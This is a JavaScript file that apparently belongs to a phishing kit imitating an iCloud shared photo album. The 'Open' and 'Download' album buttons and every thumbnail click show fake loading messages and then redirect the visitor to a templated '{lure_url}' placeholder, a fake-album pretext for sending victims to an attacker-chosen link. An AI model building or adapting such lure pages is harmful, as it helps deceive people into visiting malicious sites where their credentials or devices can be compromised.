function openAlbum() {
    const btn = document.querySelector('.btn-icloud-primary');
    btn.innerHTML = '<span>Loading album...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

function downloadAlbum() {
    const btn = document.querySelector('.btn-icloud-secondary');
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 2000);
}

document.querySelectorAll('.photo-item').forEach(item => {
    item.addEventListener('click', () => {
        window.location.href = '{lure_url}';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const items = document.querySelectorAll('.photo-item');
    items.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'scale(0.9)';
        setTimeout(() => {
            item.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
            item.style.opacity = '1';
            item.style.transform = 'scale(1)';
        }, index * 50);
    });
});
